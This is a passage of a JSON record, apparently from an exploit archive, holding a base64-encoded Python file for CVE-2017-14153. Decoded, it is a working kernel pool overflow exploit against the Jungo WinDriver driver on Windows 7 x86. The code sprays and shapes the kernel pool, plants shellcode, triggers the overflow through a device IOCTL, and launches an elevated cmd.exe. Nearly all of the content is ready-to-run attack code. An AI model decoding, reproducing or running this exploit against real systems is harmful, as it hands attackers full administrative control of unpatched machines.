FwuXFxXaW5EcnZyMTI0MCINCiAgICBkd1JldHVybiAgICAgID0gY191bG9uZygpDQogICAgZHJpdmVyX2hhbmRsZSA9IGtlcm5lbDMyLkNyZWF0ZUZpbGVBKERFVklDRV9OQU1FLCBHRU5FUklDX1JFQUQgfCBHRU5FUklDX1dSSVRFLCAwLCBOb25lLCBPUEVOX0VYSVNUSU5HLCAwLCBOb25lKQ0KICAgIGlucHV0YnVmZmVyICAgICAgID0gMHg0MTQxNDE0MQ0KICAgIGlucHV0YnVmZmVyX3NpemUgID0gMHg1MDAwDQogICAgb3V0cHV0YnVmZmVyX3NpemUgPSAweDUwMDANCiAgICBvdXRwdXRidWZmZXIgICAgICA9IDB4MjAwMDAwMDANCiAgICBhbGxvY19wb29sX292ZXJmbG93X2J1ZmZlcihpbnB1dGJ1ZmZlciwgaW5wdXRidWZmZXJfc2l6ZSkNCiAgICBJb1N0YXR1c0Jsb2NrID0gY191bG9uZygpDQoNCiAgICBpZiBkcml2ZXJfaGFuZGxlOg0KICAgICAgICBkZXZfaW9jdGwgPSBudGRsbC5ad0RldmljZUlvQ29udHJvbEZpbGUoZHJpdmVyX2hhbmRsZSwgTm9uZSwgTm9uZSwgTm9uZSwgYnlyZWYoSW9TdGF0dXNCbG9jayksIDB4OTUzODI0YjcsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnB1dGJ1ZmZlciwgaW5wdXRidWZmZXJfc2l6ZSwgb3V0cHV0YnVmZmVyLCBvdXRwdXRidWZmZXJfc2l6ZSkNCiAgICAgICAgcmV0dXJuIFRydWUNCiAgICByZXR1cm4gRmFsc2UNCg0KZGVmIHdlX2Nhbl9tYWtlX3Bvb2xfaG9sZXMoKToNCiAgICAiIiINCiAgICBUaGlzIG1ha2VzIHRoZSBwb29sIGhvbGVzIHRoYXQgd2lsbCBjb2FsZXNjZSBpbnRvIGEgaG9sZSBvZiBzaXplIDB4NDYwLg0KICAgICIiIg0KICAgIGdsb2JhbCBraGFuZGxlc2QNCiAgICBteXBpZCA9IG9zLmdldHBpZCgpDQogICAga2hhbmRsZXNkID0ge30NCiAgICBraGFuZGxlc2wgPSBbXQ0KICAgIA0KICAgICMgbGVhayBrZXJuZWwgaGFuZGxlcw0KICAgIGZvciBwaWQsIGhhbmRsZSwgb2JqIGluIGdldF9oYW5kbGVzKCk6DQoNCiAgICAgICAgIyBtaXhlZCBvYmplY3QgYXR0YWNrDQogICAgICAgIGlmIHBpZCA9PSBteXBpZCBhbmQgKGdldF90eXBlX2luZm8oaGFuZGxlKSA9PSAiRXZlbnQiIG9yIGdldF90eXBlX2luZm8oaGFuZGxlKSA9PSAiSW9Db21wbGV0aW9uUmVzZXJ2ZSIpOg0KICAgICAgICAgICAga2hhbmRsZXNkW29ial0gPSBoYW5kbGUNCiAgICAgICAgICAgIGtoYW5kbGVzbC5hcHBlbmQob2JqKQ0KDQogICAgIyBGaW5kIGhvbGVzIGFuZCBtYWtlIG91ciBhbGxvY2F0aW9uDQogICAgaG9sZXMgPSBbXQ0KICAgIGZvciBvYmogaW4ga2hhbmRsZXNsOg0KDQogICAgICAgICMgb2JqIGFkZHJlc3MgaXMgdGhlIGhhbmRsZSBhZGRyZXNzLCBidXQgd2Ugd2FudCB0byBhbGxvY2F0aW9uDQogICAgICAgICMgYWRkcmVzcywgc28gd2UganVzdCByZW1vdmUgdGhlIHNpemUgb2YgdGhlIG9iamVjdCBoZWFkZXIgZnJvbSBpdC4NCiAgICAgICAgYWxsb2MgPSBvYmogLSAweDMwDQoNCiAgICAgICAgIyBHZXQgYWxsb2NhdGlvbnMgYXQgYmVnaW5uaW5nIG9mIHRoZSBwYWdlDQogICAgICAgIGlmIChhbGxvYyAmIDB4ZmZmZmYwMDApID09IGFsbG9jOg0KICAgICAgICAgICAgYmluID0gW10NCg0KICAgICAgICAgICAgIyBvYmplY3Qgc2l6ZXMNCiAgICAgICAgICAgIENyZWF0ZUV2ZW50X3NpemUgICAgICAgICA9IDB4NDANCiAgICAgICAgICAgIElvQ29tcGxldGlvblJlc2VydmVfc2l6ZSA9IDB4NjANCiAgICAgICAgICAgIGNvbWJpbmVkX3NpemUgICAgICAgICAgICA9IENyZWF0ZUV2ZW50X3NpemUgKyBJb0NvbXBsZXRpb25SZXNlcnZlX3NpemUNCg0KICAgICAgICAgICAgIyBhZnRlciB0aGUgMHgyMCBjaHVuayBob2xlLCB0aGUgZmlyc3Qgb2JqZWN0IHdpbGwgYmUgdGhlIElvQ29tcGxldGlvblJlc2VydmUgb2JqZWN0DQogICAgICAgICAgICBvZmZzZXQgPSBJb0NvbXBsZXRpb25SZXNlcnZlX3NpemUgICANCiAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKG9mZnNldCwgb2Zmc2V0ICsgKDcgKiBjb21iaW5lZF9zaXplKSwgY29tYmluZWRfc2l6ZSk6DQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAjIGNodW5rcyBuZWVkIHRvIGJlIG5leHQgdG8gZWFjaCBvdGhlciBmb3IgdGhlIGNvYWxlc2NlIHRvIHRha2UgZWZmZWN0DQogICAgICAgICAgICAgICAgICAgIGJpbi5hcHBlbmQoa2hhbmRsZXNkW29iaiArIGldKQ0KICAgICAgICAgICAgICAgICAgICBiaW4uYXBwZW5kKGtoYW5kbGVzZFtvYmogKyBpIC0gSW9Db21wbGV0aW9uUmVzZXJ2ZV9zaXplXSkNCiAgICAgICAgICAgICAgICBleGNlcHQgS2V5RXJyb3I6DQogICAgICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICAgICAgIyBtYWtlIHN1cmUgaXQncyBjb250aWd1b3VzbHkgYWxsb2NhdGVkIG1lbW9yeQ0KICAgICAgICAgICAgaWYgbGVuKHR1cGxlKGJpbikpID09IDE0Og0KICAgICAgICAgICAgICAgIGhvbGVzLmFwcGVuZCh0dXBsZShiaW4pKQ0KDQogICAgIyBtYWtlIHRoZSBob2xlcyB0byBmaWxsDQogICAgZm9yIGhvbGUgaW4gaG9sZXM6DQogICAgICAgIGZvciBoYW5kbGUgaW4gaG9sZToNCiAgICAgICAgICAgIGtlcm5lbDMyLkNsb3NlSGFuZGxlKGhhbmRsZSkNCiAgICByZXR1cm4gVHJ1ZQ0KDQpkZWYgdHJpZ2dlcl9scGUoKToNCiAgICAiIiINCiAgICBUaGlzIGZ1bmN0aW9uIGZyZWVzIHRoZSBJb0NvbXBsZXRpb25SZXNlcnZlIG9iamVjdHMgYW5kIHRoaXMgdHJpZ2dlcnMgdGhlIA0KICAgIHJlZ2lzdGVyZWQgYWV4aXQsIHdoaWNoIGlzIG91ciBjb250cm9sbGVkIHBvaW50ZXIgdG8gT2theVRvQ2xvc2VQcm9jZWR1cmUuDQogICAgIiIiDQogICAgIyBmcmVlIHRoZSBjb3JydXB0ZWQgY2h1bmsgdG8gdHJpZ2dlciBPa2F5VG9DbG9zZVByb2NlZHVyZQ0KICAgIGZvciBrLCB2IGluIGtoYW5kbGVzZC5pdGVyaXRlbXMoKToNCiAgICAgICAga2VybmVsMzIuQ2xvc2VIYW5kbGUodikNCiAgICBvcy5zeXN0ZW0oImNtZC5leGUiKQ0KDQpkZWYgbWFpbigpOg0KICAgIHByaW50ICJcblx0LS1bIEp1bmdvIERyaXZlcldpemFyZCBXaW5Ecml2ZXIgS2VybmVsIFBvb2wgT3ZlcmZsb3cgRW9QIGV4cGxvaXQgXSINCiAgICBwcmludCAiXHQgICAgICAgICAgICAgICBTdGV2ZW4gU2VlbGV5IChtcl9tZSkgb2YgU291cmNlIEluY2l0ZVxyXG4iDQoNCiAgICBpZiByZWxlYXNlKCkgIT0gIjciIG9yIGFyY2hpdGVjdHVyZSgpWzBdICE9ICIzMmJpdCI6DQogICAgICAgIHByaW50ICIoLSkgYWx0aG91Z2ggdGhpcyBleHBsb2l0IG1heSB3b3JrIG9uIHRoaXMgc3lzdGVtLCINCiAgICAgICAgcHJpbnQgIiAgICBpdCB3YXMgb25seSBkZXNpZ25lZCBmb3IgV2luZG93cyA3IHg4Ni4iDQogICAgICAgIHN5cy5leGl0KC0xKQ0KDQogICAgcHJpbnQgIigrKSBzcHJheWluZyBwb29sIHdpdGggbWl4ZWQgb2JqZWN0cy4uLiINCiAgICBpZiB3ZV9jYW5fc3ByYXkoKToNCiAgICAgICAgcHJpbnQgIigrKSBzcHJheWVkIHRoZSBwb29sISINCiAgICAgICAgcHJpbnQgIigrKSBtYWtpbmcgcG9vbCBob2xlcy4uLiINCiAgICAgICAgaWYgd2VfY2FuX21ha2VfcG9vbF9ob2xlcygpOg0KICAgICAgICAgICAgcHJpbnQgIigrKSBtYWRlIHRoZSBwb29sIGhvbGVzISINCiAgICAgICAgICAgIHByaW50ICIoKykgYWxsb2NhdGluZyBzaGVsbGNvZGUuLi4iDQogICAgICAgICAgICBpZiB3ZV9jYW5fYWxsb2Nfc2hlbGxjb2RlKCk6DQogICAgICAgICAgICAgICAgcHJpbnQgIigrKSBhbGxvY2F0ZWQgdGhlIHNoZWxsY29kZSEiDQogICAgICAgICAgICAgICAgcHJpbnQgIigrKSB0cmlnZ2VyaW5nIHBvb2wgb3ZlcmZsb3cuLi4iDQogICAgICAgICAgICAgICAgaWYgd2VfY2FuX3RyaWdnZXJfdGhlX3Bvb2xfb3ZlcmZsb3coKToNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgIigrKSBlbGV2YXRpbmcgcHJpdmlsZWdlcyEiDQogICAgICAgICAgICAgICAgICAgIHRyaWdnZXJfbHBlKCkNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBtYWluKCk=", 
    "filename": "platforms/windows/local/42624.py", 
    "id": "42624", 
    "cves": [
        "CVE-2017-14153"
    ]
}